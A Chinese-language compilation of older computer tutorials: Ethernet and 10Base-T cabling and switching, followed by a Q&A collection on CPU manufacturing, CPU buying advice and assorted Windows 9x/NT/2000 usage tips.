　　如果逻辑电路检测到违背了曼彻斯特编码规律，便可断定有2个或2个以上的工作站同时发送，于是将开关置于下部位置，将该网板连接到一个特殊的信号发生器。该发生器产生特殊信号，即称为碰撞存的信号。碰撞存在信号传送到网板，网板据此可断定，网络电缆上存在碰撞。如果该工作站正忙于接收帧时突然收到碰撞信号，则必须放弃帧的接收。
　　如果逻辑电路部分(参见图8)无信号到达，它便将开关置于上部位置。在此位置时,网板根据无信号到达便断定网络媒体空闲。如果网板有数据要发送，则可启动发送，通过收发器进入媒体。连入网络的每一收发器都将外来信号传送到各自的网板。
　　由图8可以看到，收发器将比特送入电缆的同时，收发器又接收到自己发出的比特,并将其传回网板。这就是说，网板发出的比特，几乎同时会收回。如果碰巧网络上另一工作站同时向网络发送，电缆上便产生一种混合信号。在这种情况下，收回的信号肯定与发送的信号不一致，于是断定有碰撞存在。停止发送，进入退避阶段。
　　图8中左上角的超长(Jabber)控制是为防止工作站独占网络电缆而设计的,其功能是对发出帧长进行计时，一旦到达设定的时限，便发出信号禁止发送器发送。
　　用细缆构造网络时，由于收发器电路已集成到网板上，所以不再需要外加的收发器。网板与细缆相连通过BNC阴性T连接器来进行。
　　2.网板与双绞线的连接
　　在双绞线网络(10Base-T)环境中，网板结构除发送器和接收器与粗缆下的网板发送器和接收
器不同外，其余部分完全相同，如图6所示。在10Base-T情况下，发送器驱动的是双绞线,而且收
发器已集成到网板中,收发器与双绞线的连接是通过RJ45实现的。
RJ45: 三、 １０Base-T网络的组成 　 
　　由于使用双绞线可使媒体费用大为降低以及易于敷设等优点，10Base-T网络于90年代
开始流行。10Base-T中的10代表操作速率为10Mbpss，Base 代表基带传输方式，Ｔ代表双
绞线。
　　10Base－Ｔ具有物理结构是星型,因为所有的工作站都与称为集线器（Hub）的设备相
连，如图12所示。集线器（Hub）与工作站之间使用的双绞线为两对，一对用于发送数据，
一对用于接受数据。实现收发数据功能的收发器（Transceiver）或媒体连接单元(MAU)都
集中到网卡或（Hub）中，设有独立的设备执行这种功能，所以从外表看，构成10Base－T
网络较清楚。
　　目前可供使用的双绞线多为８芯（４对），在１０Base－Ｔ情况下，只用两对，另外
２对１０Base－Ｔ不用。这４对线的使用如表２所示。
　　表２　　　　　ＲＪ４５触点分配
触点信号
1TxD（+）
2TxD（-）
3不用
4不用
5RxD（+）
6不用
7RxD（-）
8不用
　　　Hub与工作站用双绞线相连时所用的连接器称为ＲＪ４５，并规定插头连接器端接在双绞线上，插座连接器安装在网卡上或Hub中。ＲＪ４５插头和插座如图13所示。在标准术语中，ＲＪ４５插头称为ＭＡＵ　ＭＤＩ连接器（媒体连接单元，媒体相关接口连接器），ＲＪ４５插头称为双绞线链路段连接器。表２所列出的两对信号：一对发送，一对接收。所用电路均为平衡式发送器和接受器，所以具有较高的共模抑制能力。有关这种电路的细节这里不在进一步说明。
　　(a)
(b)
　　　　　　　　　　　　　　　 图13
　　１０Base－Ｔ的构成规则应遵循下述规则：
　　规则１：双绞线应选择直径为0.4到0.6mm的无屏蔽导线，在网卡和Hub间使用两对线，
　　　　　　其最大长度为100m。
　　规则２：发送器的输出要与接收器的输入相连。
　　规则３：在构成的网络中，任何两个数据站之间的数据通路最多４个Hub。
的结构以及RJ45与网板MAU
部分的连接如图9所示。

　　　　　　　 
　　　(a)RJ45连接器的触点分配　　　　　(b)网板与RJ45的连接
　　　　　　　　　　　　　　　图9
　　在构成网络时，网板通常与Hub相连，Hub与外界在接口也是RJ45，既要使两个RJ45头连接两个RJ45座，要特别注意收发关系的正确性。发送端与接收端相连，并将极性进行适配。
六、静态、动态以太网交换技术
以太网交换技术具有许多类型，各自宣传其具有不同的优点；通过简单的鼠标即可增加、移动和改变往来落的结构；比网桥和路由器更为有效地进行网络分段；为高性能工作站或服务器提供高宽带。网络管理者渴望采用这些技术，但是首先他
们想了解各种以太网交换技术。当前有两种以太网交换技术：静态以太网交换和动态以太网交换。
一、静态以太网交换
静态以太网交换是为网络管理者通过软件来完成网络配置的增加、移动及改变而设计的。静态以太网交换工作与传统的共享式网络环境。所以称为“静态”是由于需要网络管理员的人工干预，既每次网络节点的移动和增加，网络管理员必须通
过网络管理软件进行操作。一旦一次静态交换操作完成，用户或工作站将被移到一个新的共享网段，并且一直呆在那里直到另一次新的操作。　　静态交换允许网络管理员在一个ＨＵＢ内将用户容易地从一个共享局域网总线移到另外一个共享局域网总线。如图１所示，集线器的以太网总线１是由工程部８台工作站共享的以太网网段。而以太网总线４是由市场部的工作站所共享（这些工作站在图中未标注）的网段，以上两个网段都是传统的共享局域网。当工程部某位工程师调至市场部，希望将其工作站连至市场部局域网段（以太网总线４）时，该如何操作？

　　对静态以太网交换，网络管理员只需通过网络管理工作站的集线器图形界面，
用鼠标将调离的工程师工作站所对应的端口从总线１拉至总线４即可。这种改变只
需几秒钟的时间。而传统的方法，则需网络管理员通过查线、拨号、重新布线等一
系列的工作才能完成。显然，在网络结构需经常改变的场合，静态交换以太网极为
适宜。
静态交换不能改变带宽(性能), 用户唯一可以提高网络性能的方法是将工作站
从拥挤的网段移到空闲的网段.只有动态以太网交换才可以增加标准以太网的带宽
(性能).
二、动态以太网交换
动态以太网交换最初设计思路来源于电话网, 即在一个系统内同时按需存在许多点-点会话.动态以太网交换可以在不改变标准以太网节点设备的同时( 即工作站和服务器采用标准的以太网卡,驱动程序,电缆和应用程序),极大地提高网络的带宽.其工作过程如下:交换机检查来自PC的数据包; 交换机识别该数据包的源地址和目的地址;交换机动态打开一专用的10Mbps链路,将包由源地址端口传送至目的地址端口.
　　以图2为例,动态交换检查由A工作站发往B工作站的数据包,在A与B 之间动态建
立一专用的10Mbps链路.显然,不象传统的共享以太网, 数据包不是发往网络上的所
有工作站,而是对每一数据传输产生专用的10Mbps链路.而连接到动态交换上的工作
站及服务器仍使用标准的以太网卡,驱动程序,电缆及应用程序.

在动态交换的内部,标准以太网的冲突式网络存取机制(CSMA/CD)不再存在, 与
以太网相依存的"冲突"显著变小或不复存在, 每一用户昀可独立享受局域网的全部
带宽(以太网10Mbps),所有的数据包都通过专用的点对点10Mbps链路进行交换,因此
以太网交换为诸如客户机/服务器应用,分布式数据库,图像处理,CAD,甚至多媒体等
数据密集型网络应用提供了足够的带宽.因为数据不昌传送到所有的端口,网络也难
以被窃听,所以动态交换环境比共享式以太网更加安全.
　　动态交换同时检查所有数据包,同时开辟许多的10Mbps 专用链路以完成并行的
数据通信.这样在任何时间内可以存在许多专用的源-目的以太网. 动态交换以太网
的这种并行的,点对点特性与电话网相似,同时也与FTM相近.一旦一个独立的端口通
信完成,动态交换释放此链路.因此,动态交换的带宽流量是按需的,这种按需带宽特
性是ATM网的另一特性.但因动态以太网交换是建立在标准以太网基础上( 标准接口
卡,驱动,电缆和应用) , 用户可以保留其在原有以太网上的投资和基础上, 获得像
ATM一样的专用带宽及安全保密性.
三、以太网交换技术分类
面已讨论了动态交换和静态交换在功能和应用上的基本差异, 下面将着重讨
论每种交换技术的两种实现方式:
*动态端口交换
*动态段交换
*静态端口交换
*静态模块交换
　　对静态交换而言,模块交换和端口交换差别很小,它们可应用于相同的场合, 而对动态交换,段交换与端口交换的应用明显不同.
1.动态端口交换
　　动态端口交换的功能已在前面讲述过,每一端口联接到单一的工作站或服务器.因为每一端口可被按需赋予一个独立的 10Mbps专用以太网链路,这样可以赋予每一工作站或服务器更高的网络带宽.
2.动态段交换
　　动态段交换与动态端口交换的功能相似,通过交换结构,按需提供专用的端口间10Mbps专用链路.每一动态段交换端口可以连接一个网段(即传统的共享以太网),而不只是一个工作站或服务.动态段交换通过对大量MAC地址的识别来完成此功能。用端口连结整个网段,可以使动态段交换取代现今分段网络中的路由器及网桥.　　如图3所示，如果网段A的用户在网段内发送数据包, 交换识别数据为本网段数据包而不允许这些数据包进入其它网段.但是如果网络段A的用户发送数据包到网络段B,则交换机识别那些传送至网段B的数据包,分配一专用的10Mbps链路，发送数据包到网段B的目的用户.网络分段,即将一个大的拥挤的网络分成一系列的小型网络,每一网络具有小的用户和小的流量.　　以前网络分段一般是通过网桥和路由器来实现的, 而采用动态段交换对网络分段比用网桥和路由器更优越,理由如下:
(1)价低.
(2)易管理,而路由器需要QSI协议中网络层的复杂网络管理.
(3)更快速,因为交换只检测其数据包头中的源及目的地址, 而网桥及路由器则需检测
　　整个包,这样交换所产生的时延比网桥及路由器小得多.
3.静态端口交换
　　静态端口交换允许网络管理员通过软件将用户工作站从一条共享以太网总线移到另一条，灵活地对网络进行增加,减少所需的交换模块订货量.例如,在网络上增加8个用户,他们工作于4个不同的部门,在4条不同的以太网总线上。所有这些用户可以采用一块单一的端口交换模块来实现.与此相比,以前则需购4 块新的模块并连到不同的总线,但每个新的模块的大部分端口是未用的,造成低效及浪费.
4.静态模块交换
　　静态模块交换也是由软件来实现网络的增加,移动和改变.与静态端口交换不同的
是,静态模块交换是将整个模块(包括模块上的所有端口) 从一条共享总线移至另一条
共享总线.
四、问题与解决方案
下表是根据在网络发展及改变中遇到的不同问题而给出的交换以太网解决方
案。
网络问题 
以太网交换方案 
优点 
　　由于网络快速增长重新
架构、灵活移动或规模调整
所产生的网络的经常增加、
移动改变。 
组合：
静态模块交换
静态端口交换 
　　在网络管理工作站由软件
容易地实现网络的增加、移动
改变。
　　可以减少随着网络新用户
增加而需订购的模块数 
　　需对网络进行有效的分
段，网络有许多新用户 
动态段交换 
　　与网桥及路由器相比、更
有效、廉价、易管理、更高的
流量 
　　高性能用户的高带宽要
求 
动态端口交换 
　　动态按需分配带宽给每个
用户 
　　需产生客户机／服务器
结构，易管理并提供高带宽
应用 
组合：
动态段交换
动态端口交换 
　　专用的100Mbps服务器连
接；专用的100Mbps客户机连
接；多路专用的10Mbps服务
器连接；专用的10Mbps客户
机连接；共享LAN段的客户
机的有效分段 











二：电脑基础知识
61,Q:CPU 的制做过程和工艺
    A:CPU 发展至今已经有二十多年的历史，其中制造 CPU 的工艺技术也经过了长足的发展，以前的制造工艺比较粗糙，而且对于读者了解最新的技术也没有多大帮助，所以我们舍之不谈，用今天比较新的制造工艺来向大家阐述。
   许多对电脑知识略知一二的朋友大多会知道 CPU 里面最重要的东西就是晶体管了，提高 CPU 的速度，最重要的一点说白了就是如何在相同的CPU面积里面放进去更加多的晶体管。由于 CPU 实在太小，太精密，里面组成了数目相当多的晶体管，所以人手是绝对不可能完成的（笑），只能够通过光刻工艺来进行加工的。这就是为什么一块 CPU 里面为什么可以数量如此之多的晶体管。晶体管其实就是一个双位的开关：即开和关。如果您回忆起基本计算的时代，那就是一台计算机需要进行工作的全部。两种选择，开和关，对于机器来说即0和1。那么如何制作一个CPU 呢? 以下我们用英特尔为例子告诉大家。
   首先：取出一张利用激光器刚刚从类似干香肠一样的硅柱上切割下来的硅片，它的直径约为 20cm。除了 CPU 之外，英特尔还可以在每一硅片上制作数百个微处理器。每一个微处理器都不足一平方厘米。
   接着就是硅片镀膜了。相信学过化学的朋友都知道硅(Si)这个绝佳的半导体材料，它可以电脑里面最最重要的元素啊！在硅片表面增加一层由我们的老朋友二氧化硅(SiO2)构成的绝缘层。这是通过 CPU 能够导电的基础。其次就轮到光刻胶了，在硅片上面增加了二氧化硅之后，随后在其上镀上一种称为“光刻胶”的材料。这种材料在经过紫外线照射后会变软、变粘。然后就是光刻掩膜，在我们考虑制造工艺前很久，就早有一非常聪明的美国人在脑子里面设计出了 CPU，并且想尽方法使其按他们的设计意图工作。CPU 电路设计的照相掩膜贴放在光刻胶的上方。照相字后自然要曝光“冲晒”了，我们将于是将掩膜和硅片曝光于紫外线。这就象是放大机中的一张底片。该掩膜允许光线照射到硅片上的某区域而不能照射到另一区域，这就形成了该设计的潜在映像。
   一切都办妥了之后，就要到相当重要的刻蚀工艺出场了。我们采用一种溶液将光线照射后完全变软变粘的光刻胶“块”除去，这就露出了其下的二氧化硅。本工艺的最后部分是除去曝露的二氧化硅以及残余的光刻胶。对每层电路都要重复该光刻掩膜和刻蚀工艺，这得由所生产的 CPU 的复杂程度来确定。尽管所有这些听起来象来自“星球大战”的高科技，但刻蚀实际上是一种非常古老的工艺。几个世纪以前，该工艺最初是被艺术家们用来在纸上、纺织品上甚至在树木上创作精彩绘画的。在微处理器的生产过程中，该照相刻蚀工艺可以依照电路图形刻蚀成导电细条，其厚度比人的一根头发丝还细许多倍。
   接下来就是掺杂工艺。现在我们从硅片上已曝露的区域开始，首先倒入一化学离子混合液中。这一工艺改变掺杂区的导电方式，使得每个晶体管可以通、断、或携带数据。将此工艺一次又一次地重复，以制成该 CPU 的许多层。不同层可通过开启窗口联接起来。电子以高达 400MHz 或更高的速度在不同的层面间流上流下，窗口是通过使用掩膜重复掩膜、刻蚀步骤开启的。窗口开启后就可以填充他们了。窗口中填充的是种最普通的金属－铝。终于接近尾声了，我们把完工的晶体管接入自动测试设备中，这个设备每秒可作一万次检测，以确保它能正常工作。在通过所有的测试后必须将其封入一个陶瓷的或塑料的封壳中，这样它就可以很容易地装在一块电路板上了。
   目前，单单 Intel 具有 14 家芯片制造厂。尽管微处理器的基本原料是沙子(提炼硅)，但工厂内空气中的一粒灰尘就可能毁掉成千上万的芯片。因此生产 CPU 的环境需非常干净。事实上，工厂中生产芯片的超净化室比医院内的手术室还要洁净1万倍。“一级”的超净化室最为洁净，每平方英尺只有一粒灰尘。为达到如此一个无菌的环境而采用的技术多令人难以置信。在每一个超净化室里，空气每分钟要彻底更换一次。空气从天花板压入，从地板吸出。净化室内部的气压稍高于外部气压。这样，如果净化室中出现裂缝，那么内部的洁净空气也会通过裂缝溜走－防止受污染的空气流入。 但这只是事情一半。在芯片制造厂里，Intel 有上千名员工。他们都穿着特殊的称为“兔装”的工作服。兔装是由一种特殊的非棉绒、抗静电纤维制成的，它可以防止灰尘、脏物和其它污染损坏生产中的计算机芯片。这兔装有适合每一个人的各种尺寸以及一系列颜色，甚至于白色。员工可以将兔装穿在在普通衣服的外面，但必须经过含有 54 个单独步骤的严格着装程序。而且每一次进入和离开超净化室都必须重复这个程序。因此，进入净化室之后就会停留一阵。在制造车间里，英特尔的技术专家们切割硅片，并准备印刻电路模板等一系列复杂程序。这个步骤将硅片变成了一个半导体，它可以象晶体管一样有打开和关闭两种状态。这些打开和关闭的状态对应于数字电码。把成千上万个晶体管集成在英特尔的微处理器上，能表示成千上万个电码，这样您的电脑就能处理一些非常复杂的软件公式了。  
 62,Q:什么样的 CPU 适合你?
    A:如今的 CPU 市场已经进入了又一个群雄逐鹿的战国时代，老牌劲旅 INTEL 和 AMD、VIA(主要是AMD)斗得不可开交，不停地推出更高主频的 CPU，价格却一降再降。目前 OEM 市场主要还是 INTEL 的天下，一个个打着 Intel inside 和采用 INTEL PentiumⅢ 处理器的电脑卖的如火如荼，可组装机市场 INTEL 就没有那么幸运了，自从 AMD 推出了 K6-2 以来，INTEL 的日子一天比一天那么难过，到了今天，这两家已经是半斤八两，各有千秋了。
   现在，供我们可选的 CPU 大体可分为高端和低端，坐阵 INTEL 高端的有最新的 Pentium4，coppermine 和 PⅢE 系列，AMD 那边主要是新速龙。低端市场 INTEL 的有 celeronII，AMD 则有 Duron。除了这几种 CPU还有许多 CPU 由于其性能介于其间，故不在此一一介绍。先说说 Pentium4，这是 INTEL 刚刚推出的新一代 CPU，仍为 32 位架构，搭配最新的 I850 芯片组和昂贵的 RAMBUS 内存，性能并未有质的变化，只因其全新的系统总线(400MHz)和极高的主频(目前有 1.4GHz 和 1.5GHz 两种)使其有了一个很好的卖点。coppermine，133MHz 系统总线，0.18μm 工艺，优秀的整数和符点运算，良好的兼容性，使其在不管是在 OEM 市场还是在组装机市场都是用户的首选，PⅢE 系列，它虽然只有 100MHz 的系统总线，但同样经过优化的 L2 cache，0.18μ 的工艺，但它的低外频为超频爱好者提供了一个很好的发挥舞台。新速龙是 AMD 继老 ATHLON 的成功后推出的 0.18μm,铝连接(以后要改为铜连接)，100MHz 的 EV6 总线(一种类于 DDR 的总线，性能等效于 INTEL 200MHz 的 P6 总线）使其具有比 INTEL 更高的外频，新速龙不但保留了 AMD CPU 一贯良好的整数运算和从 ATHLON 开始超过 INTEL 的符点运算和其优良的性价比在市场中赢得了不少赞誉，但偏高的发热量成为其超频的弊端。在低端市场 celeronII 是 INTEL 继 celeron A 系列推出的新一代 celeron CPU，它采用的是 coppermine 内核，128K 的全速 L2 cache，不高的价格，良好的兼容性在市场中卖的还不错。我们再来说说 AMD 的 Duron，Duron 其实是新速龙的一个简化版，略微的缩水使其在性能上依然超过 INTEL 的 celeronII(包括目前刚刚发布的 100MHz 外频 celeronII)，它极高的性价比成为低价入门电脑的首选，但过高的发热量如不及时排掉，就会造成系统的不稳定，和不能超频。以上说法仅工参考。  
 63,Q:小心购买封装 CPU
    A:你买的是盒装 CPU 吗？小心你买的是后封装的！
   什么是后封装？后封装就是有人先收购盒装 CPU 的包装盒和里面的说明书，再将散装的 CPU 装进去，最后塑封。目前最流行的就是将英特尔的 866、933、1G 的 CPU 后封装。还有部分“赛扬”也成为了谋取暴利的 JS(奸商)的宝贝。
   他们的成本是多少呢？首先他们在市场里面收购说明书或外包装，通常是 2 元一本说明书。最终他们卖掉的价钱是要比原来的散装价格贵出 50元～100 元不等。可是成本才 2 元钱，最多加上他们的“包装费”。最令人可气的是由于这些奸商的所作所为，影响到正规的经销商不敢进盒装的 CPU。因为在价格上拼不过他们，干脆就不作赔钱买卖。结果市场上就有了这些无人与之竞争的后封装 CPU。 
Windows
1,Q:Windows 系统软件的安装技巧:
     A:Windows 的安装,一般情况下,人们习惯于从光盘上直接安装。 但是,我强烈建议您将 Windows 拷贝到硬盘上进行安装。其理由如下： 
     (1)如今硬盘已经越做越大，拷贝 Windows 到硬盘已经对硬盘的空间利用不会产生大的影响； 
     (2)拷贝 Windows 到硬盘，实际上同时对 Windows 安装盘做了一个备份； 
     (3)从硬盘上安装 Windows 比从光盘上安装快； 
     (4)在对 Windows 进行设置时，经常需要 Windows 的源安装盘拷贝一些文件。将 Windows 拷贝到硬盘后，不再需要到处寻找 Windows 的安装光盘。   
    2,Q:Windows 程序 mystartprogram.exe 为什么不执行?
     A:有人在 Windows 下写了一个程序,取名 mystartprogram.exe,加在自动批处理文件 AUTOEXEC.BAT 中,想让它在机器启动时自动执行,但是总不能成功。为什么呢？原因是文件名太长了，不符合 DOS 文件名 8.3 的格式。 虽然 Windows 支持长文件名，但在机器运行 AUTOEXEC.BAT 时，它还处于 DOS 的控制之下，而在 DOS 环境下，mystartprogram.exe 的真实文件名是 mystar~1.exe。所以，解决办法是：要么在 AUTOEXEC.BAT 中加载 mystar~1.exe,要么将 mystartprogram.exe 修改为 8.3 格式的 DOS 短文件名。   
    3,Q:Windows 光驱“丢失”一例:
     A:某机器，在“我的电脑”里不能看见光驱图标(当然更不能使用光驱了)。 在“我的电脑/控制面板/系统/性能”中，Windows 显示“...主引导记录已被改写...”等信息，于是怀疑系统感染病毒。用 KV300+ 杀毒盘引导机器，然后查毒，果然在硬盘的主引导区发现 CMOS 病毒。杀毒后系统恢复正常。   
    4,Q:重新建立文件“关联”：
     A:在资源管理器中选中该文件，按住 Shift 键，单击鼠标右健，执行弹出菜单的“打开方式”项， 然后，在“打开方式”窗口中选择其新对应的应用程序，勾选窗口下方的“始终使用该程序打开这种类型的文件”项，最后按“确定”按钮。 这样，以后只要双击这种类型的文件，新选择的应用程序就会自动打开文件。   
    5,Q:屏幕保护,立竿见影：
     A:屏幕保护在键盘空闲多长时间后执行？设置短了太烦人;太长了, 在你离开机器后将有很长时间使机器处于“开放”状态，不太安全。最好是在你离开机器时，使机器立即进入屏保状态。可以这样作： 在 Windows 目录下找到 *.scr 类型的屏幕保护程序，拖放到桌面上，在你离开时双击执行它，即可使机器立即进入屏保状态。   
    6,Q:怎样直接删除文件,而不是放入回收站?
     A:选中文件,右键单击,按 Shift 键,再选“删除”。   
    7,Q:WindowsNT4.0 server 版安装后,为什么显卡驱动程序总是不起作用?
     A:这种情况经常出现在安装 AGP 显卡的机器上,因为 WindowsNT4.0 server 最初发布时, AGP 类型的显卡还没出现,因此 WindowsNT4.0 server 必须安装 SP4 以上的补丁包,才能支持 AGP 类型的显卡。   
    8,Q:为什么我的 Windows9x/NT/Win2000/WindowsMe 不能进入纯 DOS 环境?
     A:原因可能如下: 
     (1)你的机器安装了 Windows97; 
     (2)你的 C: 盘为为 FAT32 (非FAT16)分区格式; 
     (3)你的 C: 盘为 NTFS 分区格式(OS 为 NT/Win2000 时)。 
     (4)WindwsMe 本身已经取消了进入纯 DOS 环境的功能。   
    9,Q:怎样在桌面上建立文件夹的快捷方式?
     A:(1法)鼠标右击桌面，选“新建/快捷方式”，在“新建快捷方式” 对话窗口中的文本框里输入文件夹的正确路径后，按“下一步”，再按“完成”即可。在 Windwos2000 中， 还可以按“新建快捷方式”对话窗口上的“浏览”按钮，选择文件夹，再建立其快捷方式。(2法)鼠标右击文件夹，选“发送到-桌面快捷方式”即可。   
    10,Q:我正在进行磁盘碎片整理,但它为什么不时地又“从 0 开始……”?
      A:首先看看你有没有运行病毒监测等定时运行的程序,如果有的话,应将它们关闭; 再看看你的机器是否在联网状态,如果有人不时访问你的硬盘,那一定会影响你进行磁盘碎片整理。   
    11,Q:Windows2000 启动时为什么要读软驱?
      A:Windows2000不仅运行在所有的台式机上，而且适用于笔记本等移动用户。 对于笔记本电脑，软驱是它们的“可移动”(removable)设备。考虑到这一点，Win2000在启动时读软驱是为了检测机器的硬件配置情况， 并不是机器“中毒”或设计缺陷。   
    12,Q:怎样使 Windows2000 启动时不读软驱?
      A:在Windows2000下，右击“我的电脑”-“属性”-“硬件”-“设备管理器”， 找到软盘驱动器，在它的“属性”对话框中设置为“禁用”就可以了。   
    13,Q:如何修改 Windows 启动密码?
      A:在“控制面板/密码/更改密码”窗口中，点按钮“更改Windows密码(W)...”进行修改。   
    14,Q:为什么在运行 Word 等程序时,有时出现“……应用程序出错……”的错误?
      A:可能你 C: 盘的剩余空间太小了，影响了Windows 虚拟内存的创建。想办法增加 C: 盘的剩余空间试试。   
    15,Q:使 Windows9x 恢复(Windows+DOS)双启动?
      A:Windows97 默认不能进行双启动,或者由于别的原因使 Windows95/98 丢失了双启动的特性。怎么办? 按以下步骤： 
      (1)Windows 环境下，将 C:\ 下的 IO.SYS、MSDOS.SYS 和 COMMAND.COM 备份至目录 C:\WINBOOT.BAK 下(注意以上 3 文件的属性)； 
      (2)用 DOS6.22 启动机器，然后执行： A:\>sys A: C: 这样，DOS 的IO.SYS、MSDOS.SYS 和 COMMAND.COM 会覆盖掉 Windows 的 3 个 同名文件； 
      (3)DOS 环境下，将 C:\ 的以上 3 文件去掉各种属性，将它们改名： IO.SYS --> IO.DOS，MSDOS.SYS --> MSDOS.DOS，COMMAND.COM --> COMMDND.DOS； 
      (4)DOS 环境下，将 Windows 的 C:\WINBOOT.BAK 下的 3 个备份文件拷回 C:\，即执行：copy C:\winboot.bak\*.* C:\； 
      (5)完成。启动 Windows。恢复 3 个系统文件的 RHS 属性。   
    16,Q:怎样自动安装 Windows98?
      A:如果要给配置相同的多台电脑安装 Windows98,则可以制作一个自动安装脚本,进行 Windows98 的自动安装。具体做法是：在一台已经安装有 Win98 的电脑上，安装 Win98 安装源盘 \tools\reskit\batch 路径下的“Microsoft Batch 98”， 然后使用它提供的“收集目前注册表设置”或“系统设置”方式自动或手动生成一个 msbatch.inf 文件，然后将该文件放到软盘或硬盘上，按 “Setup [path:]〈msbatch.inf〉”的方式启动安装命令，则安装程序就可以按 .inf 文件给出的设置进行自动安装。   
    17,Q:快速安装 Windows98 的一些命令行参数?
      A:如果机器硬件正常，则可以用 
        Setup /id /ie /ih /im /is /iv 的方式快速安装 Win98。这些参数的意义为： 
        /id 跳过磁盘空间检查 
        /ie 不制作安装盘 
        /im 跳过内存检查 
        /is 不执行磁盘扫描 
        /iv 不显示版本说明   
    18,Q:WindowsNT4.0 安装时可以不制作 3 张安装盘吗?
      A:可以。用以下形式即可： WINNT /b   
    19,Q:为什么安装 WindowsNT4.0 后，要安装其补丁程序包(Service pack)?
      A: 微软的软件补丁，修正了NT4.0中的一些错误，对部分软件模块进行了升级，还包括 NT4.0 的 Y2K 修正模块。只有安装了 SP4/SP5/SP6 补丁包， 才能保证我们的应用系统运行在一个比较完善、可靠的操作平台上。必要的情况下， 还应安装其选件包 OP4(Optional Pack 4.0)。   
    20,Q:操作系统对内存的大小有什么要求?
      A: DOS,UCDOS  ≥1M 
        Window3.1/3.2  ≥2M 
        Window95   ≥8M 
        Window98   ≥16M 
        Window2000   ≥32M   
    21,Q:怎样使用 PDOS95?
      A:PDOS95 是 Windows9x 自带的一种汉字系统，在 Windows9x 的 MS-DOS 方式下使用。使用方法是， 进入MS-DOS 方式，在命令行状态下键入 PDOS95，回车。这时，屏幕右下方会显示一行黄色文字：“Windows95中文DOS方式”，表明已经进入 PDOS95 汉字状态。要输入汉字，按“Ctrl+空格”即可。其它功能键是：“Shift+空格”可切换“全角/半角”，“Ctrl+Shift”可选择输入法。 在命令行状态下执行 Quit 可以退出 PDOS95 方式，执行 Exit 可以退出 MS-DOS 方式并返回 Windows 图形用户界面。   
    22,Q:如何认识 Windows9x 的 MSDOS.SYS 文件?
      A:Windows9x 的 MSDOS.SYS 文件不同于纯 DOS 的 MSDOS.SYS。在 Windows9x 中，MSDOS.SYS 是一个文本格式的系统配置文件，可以对 Windows9x 的开机状态进行设置。去掉该文件的所有属性后，可以用 Edit 或记事本(Notepad)对其进行编辑。 
        [Paths] 
        WinDir=C:\WINDOWS    ; 指明 Win98 所在的目录 
        WinBootDir=C:\WINDOWS    ; 指明启动 Win98 的目录 
        HostWinBootDrv=C    ; 启动驱动器的盘符 
        [Options] 
        BootMulti=1     ; 1 表示可以进入纯 DOS 方式，0 表示不可以 
        BootMenu=1    ; 1 表示显示多重启动选单 
        BootGUI=1     ; 1 表示开机后进入 Win98，0 表示开机后进入 DOS7.0 
        WinVer=4.10.1998    ; 显示 Windows 的版本号(4.10.1998 对应 Windows98 第一版)   
    23,Q:忘记 Windows 的 CDKEY 怎么办?
      A:忘记 Windows 的 CDKEY 时，可以在系统的注册表里去查，办法是： 运行 Regedit 程序，在 Windows95注册表搜索字符串 ProductID，在 Windows98 注册表搜索字符串 ProductKey， 找到的键值即为本 Windows 的CDKEY 号。   
    24,Q:什么是线程?
      A:线程是指程序的一个指令执行序列，WIN32 平台支持多线程程序，允许程序中存在多个线程。 在单 CPU 系统中，系统把 CPU 的时间片按照调度算法分配给各个线程，因此各线程实际上是分时执行的，在多 CPU 的 Windows NT 系统中， 同一个程序的不同线程可以被分配到不同的 CPU 上去执行。由于一个程序的各线程是在相同的地址空间运行的，因此设及到了如何共享内存， 如何通信等问题，这样便需要处理各线程之间的同步问题，这是多线程编程中的一个难点。   
    25,Q:怎样快速重新启动 Windows ?
      A:在进入关机画面时，选“关闭计算机”，按住 Shift 键不放，点按纽 [是] 即可。   
    26,Q:简单屏蔽 Windows 的自动运行功能?
      A:在放入 CD 碟片、或放入自动运行的程序光盘时，先按住 Shift 键不放，再推入碟片。   
    27,Q:简单隐藏“控制面板”窗口中的图标:
      A:简单设置 Windows 文件夹下的 control.ini 文件，可以隐藏“控制面板” 窗口中的图标。方法为，打开 control.ini 文件，将下列语句放置到 control.ini 文件的 [dont't load] 节中，保存，再重新启动机器： 
        netcpl.cpl=yes ; 隐藏“网络” 
        appwiz.cpl=yes ; 隐藏“添加/删除用户” 
        inetcpl.cpl=yes ; 隐藏“用户”和“Internet” 
        odbccp32.cpl=yes ; 隐藏“32位 ODBC” 
        sysdm.cpl=yes ; 隐藏“系统”和“添加新硬件” 
        password.cpl=yes ; 隐藏“密码” 
        modem.cpl=yes ; 隐藏“调制解调器” 
        desk.cpl=yes ; 隐藏“显示”   
    28,Q:系统关机时总是提示 msgsrv32.exe 出错，如何处理?
      A:msgsrv32.exe 是一个管理信息窗口的应用程序，在此出错的常见原因是 DirectX 不支持某种显卡或声卡的驱动程序造成的， 每当用户运行需要 DirectX 支持的软件时，就会产生死机现象。为解决该问题，可以先进入“安全模式”，将声卡或显卡驱动程序删除，然后再安装新的驱动程序试试。   
    29,Q:有时文档文件夹出现“Vbe\01\1\2”之类的空文件夹，这是怎么回事?
      A:   
    30,Q:将 Windows9x/NT4.0 变成你的“OEM 版”?
      A:在你的 Windows9x 的 system 文件夹下创建文本文件 OEMINFO.INI，编辑成如下内容格式： 
        [General] 
         manufacturer=电脑品牌 
         model=电脑型号 
         [Support Information] 
         line1="……" 
         line2="……" 
         line3="O'ICQ: 9365822" 
         …… 
       再制作一幅 180x110 像素的 BMP 图像(背景最好透明)，作为你的 Logo 标志，以 OEMLOGO.BMP 命名，存放于 Windows\system 文件夹下。这样，当你右击“我的电脑”图标，选“属性”，就可以看到类似“联想”品牌机一样的 OEM 信息了，点“支持信息”按纽，还可以看到在 OEMINFO.INI 中设置的支持信息。 
       在 WindowsNT4.0 中，以上文件存放在 Winnt\system32 文件夹下。 
       ( 站长注：本站长写有一个程序，可以帮你方便的完成这些工作，请在 “站长专区-站长玩编程”找这个程序。)   
    31,Q:如何一次性删除硬盘上的 *.BAK 文件?
      A:调出“查找”界面，查找硬盘里所有文件夹中的 *.BAK 文件，找到后，选择并删除它们。 如果要对硬盘上的所有图形文件进行打包备份，也可以照此处理。   
    32,Q:怎样解决 Windows2000 安装中的 ACPI 错误问题?
